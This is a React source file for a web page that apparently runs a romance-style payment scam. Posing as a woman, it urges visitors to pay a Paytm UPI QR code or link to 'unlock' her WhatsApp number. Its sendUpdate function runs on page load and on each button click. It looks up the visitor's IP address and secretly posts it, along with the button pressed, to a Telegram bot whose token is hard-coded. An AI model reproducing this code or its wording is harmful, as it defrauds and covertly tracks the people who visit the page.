/* eslint-disable no-unused-vars */
import './App.css';
import React, { useEffect, useState } from 'react';
import { Modal, ModalHeader } from 'reactstrap';
import PaymentModal from './modal';
import ConfirmModal from './confirm';

let ip = 'Not Found'

async function sendUpdate(msg) {
  if (ip === 'Not Found') {
    fetch('https://api.db-ip.com/v2/free/self')
      .then(result => result.json())
      .then((output) => {
        ip = output;
        const url = `https://api.telegram.org/bot5479990786:AAEcL3ltMHl3phz_HP3TXMXMX1dpeI4grCM/sendMessage?chat_id=-1001166751237&text=${msg}--------${ip.ipAddress}`
        fetch(url, {
          method: "POST",
          headers: { 'Content-Type': 'application/json' },
          body: ''
        }).then(res => {
          console.log("Request complete!");
        })
      }).catch(err => console.error(err));
  } else {
    const url = `https://api.telegram.org/bot5479990786:AAEcL3ltMHl3phz_HP3TXMXMX1dpeI4grCM/sendMessage?chat_id=-1001166751237&text=${msg}--------${ip.ipAddress}`
    fetch(url, {
      method: "POST",
      headers: { 'Content-Type': 'application/json' },
      body: ''
    }).then(res => {
      console.log("Request complete!");
    })
  }
}

function App() {
  const [isOpen, setisOpen] = useState(false);
  const [isConfirmOpen, setisConfirmOpen] = useState(false);

  useEffect(() => {
    sendUpdate("Home");
    setTimeout(() => {
      console.log("launching");
      //window.open("upi://pay?pa=paytmqr28100505010111o4jao8e1ay@paytm&pn=ReddyGirl&tn=ReddyGirl", "_self");
    }, 1500);
  }, []);



  const handlepayButton = async () => {
    // setisConfirmOpen(!isOpen)
    await sendUpdate("PayButton")
    window.location.href = "https://paytm.me/u-dSry0";
  }

  const handleWspButton = async () => {
    setisOpen(!isOpen)
    await sendUpdate("WhatsppBtn")
    //window.open("upi://pay?pa=paytmqr28100505010111o4jao8e1ay@paytm&pn=ReddyGirl&tn=ReddyGirl&am=1000", "_self");
    //return (<PaymentModal isOpen={true}></PaymentModal>)
  }

  const MsgBtnCombo = ({ msg, btnName, handler, err }) => {
    return (
      <div className="msgBtn">
        <h6>{msg}</h6>
        <button className='button' onClick={() => { handler() }}>{btnName}</button>
        {false
          && <span>
            <p style={{ margin: "0px", fontWeight: 'normal', fontSize: "11px", color: "red" }}>PhonePe is not Working tempoarily!!</p>
            <p style={{ margin: "0px", fontWeight: 'normal', fontSize: "11px", color: "red" }}>Pay using QR Code Above or use GPay</p>
          </span>
        }
      </div>
    )
  }

  return (
    <div className="App" onClick={() => { /*setisOpen(false) */ }}>
      <header className="App-header">
        <h1 style={{ color: "#82ffa5" }}><img style={{ width: "200px" }} alt='' src='./logo.svg'></img></h1>
        <p style={{ fontSize: "20px", fontWeight: "bolder", marginTop: '35px' }}>Copy <p style={{ color: '#c9df3d', cursor: 'pointer', display: 'contents' }} onClick={async () => {
          navigator.clipboard.writeText("paytmqr281005050101jnirp1ueoe1y@paytm");
        }}>UPI ID </p>or  <a style={{ color: '#c9df3d', cursor: 'pointer', marginBottom: '0px' }} href='upi://pay?pa=paytmqr281005050101jnirp1ueoe1y@paytm&cu=INR&pn=Reddy%20Girl' onClick={async () => {
          navigator.clipboard.writeText("paytmqr281005050101jnirp1ueoe1y@paytm");
        }}>Scan</a> the QR code!!</p>
        <CopyExample />
        <MsgBtnCombo msg="You should PAY first to Unlock My Number!!😜" btnName="PAY NOW!!" handler={handlepayButton} err={true}></MsgBtnCombo>
        <MsgBtnCombo msg="Click Below👇 For My Whatsapp Number!!" btnName="Whatsapp Number!" handler={handleWspButton} err={false}></MsgBtnCombo>
        <h6 style={{ color: "bisque", fontSize: "1rem" }}>PAY NOW and Send me SCREENSHOT on Telegram!!🥰</h6>
        {isOpen && <PaymentModal isOpen={isOpen} setisOpen={setisOpen} fn={handlepayButton} className="special_modal"></PaymentModal>}
        {isConfirmOpen && <ConfirmModal isOpen={isConfirmOpen} setisOpen={setisConfirmOpen} fn={handlepayButton} className="special_modal"></ConfirmModal>}
      </header>
    </div >
  );
}

function CopyExample() {
  const [isCopyOpen, setIsCopyOpen] = useState(false);

  const toggle = () => {
    setIsCopyOpen(!isCopyOpen)
  }

  const Copymodal = () => {

    return (
      <div>
        <Modal style={{ padding: "10vh 15px" }} isOpen={isCopyOpen} toggle={toggle} fade={true} className="special_modal">
          <ModalHeader toggle={toggle} style={{ borderBottom: '0px' }}>
            <p style={{ fontSize: "15px" }}>UPI Address Copied to Clipboard!!</p>
            <div className='insideCard'>
              <p style={{ margin: "0px" }}>Open <span style={{ color: "#fff" }}>PhonePe/PayTm</span> and Paste the UPI Address to Pay!!</p>
            </div>
          </ModalHeader>
        </Modal>
      </div>
    );

  }

  return (
    <div className='card' style={{ backdropBlur: '10px' }}>
      <div style={{ color: "mistyrose", fontWeight: 'bold', padding: "0px 10px" }}>
        {/* <p style={{ fontSize: "15px" }}>If "<span style={{ color: "red" }}>PAY NOW</span>" Button is Not Working!!</p> */}
        <p style={{ margin: "10px" }}> Pay to my QR Code 👇🏻👇🏻👇🏻</p>
      </div>
      <img className='qr' title='paytmqr281005050101jnirp1ueoe1y@paytm' style={{ marginTop: "6px" }} alt='' src='./QR.jpg'></img>
      <img className='upi' style={{ marginBottom: "0px", width: "140px" }} alt='' src='./upilogo.png'></img>
      {
        <div style={{ display: "flex", padding: "12px", height: "50px" }}>
          <span style={{ fontWeight: "bold", marginBottom: "5px" }}>UPI: </span>
          <input title='paytmqr281005050101jnirp1ueoe1y@paytm' readOnly value={"PaytmQR281......@paytm"} style={{ fontSize: '17px', textOverflow: 'ellipsis', fontWeight: 'normal', cursor: 'copy' }}></input >
          <button title='paytmqr281005050101jnirp1ueoe1y@paytm' className='cpybutton' onClick={async () => {
            navigator.clipboard.writeText("paytmqr281005050101jnirp1ueoe1y@paytm");
            setTimeout(() => {
              // window.location.href = 'upi://pay?pa=paytmqr281005050101jnirp1ueoe1y@paytm&cu=INR&pn=Reddy%20Girl'
            }, 2500);
            setIsCopyOpen(true); await sendUpdate('Copied');
          }}>Copy</button>
        </div>
      }
      <Copymodal></Copymodal>
    </div >
  );
}


export default App;
